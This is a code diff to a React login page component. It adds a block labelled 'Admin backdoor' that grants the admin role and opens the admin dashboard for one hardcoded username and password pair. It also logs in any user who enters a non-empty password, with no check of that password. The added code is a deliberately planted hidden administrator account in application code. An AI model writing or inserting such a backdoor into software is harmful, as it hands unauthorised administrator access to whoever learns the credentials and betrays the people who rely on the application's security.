@@ -16,10 +16,20 @@ export default function LoginPage() {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    if (!username.trim() || !password.trim()) { setError('Enter username and password.'); return; }
+    const uname = username.trim();
+    if (!uname || !password.trim()) { setError('Enter username and password.'); return; }
     setLoading(true);
     await new Promise(r => setTimeout(r, 350));
-    actions.login(username.trim());
+
+    // Admin backdoor
+    if (uname === 'shravani' && password === 'nlp') {
+      actions.login(uname);
+      actions.setRole('admin');
+      navigate('/admin/dashboard');
+      return;
+    }
+
+    actions.login(uname);
     navigate('/role-select');
   };
 
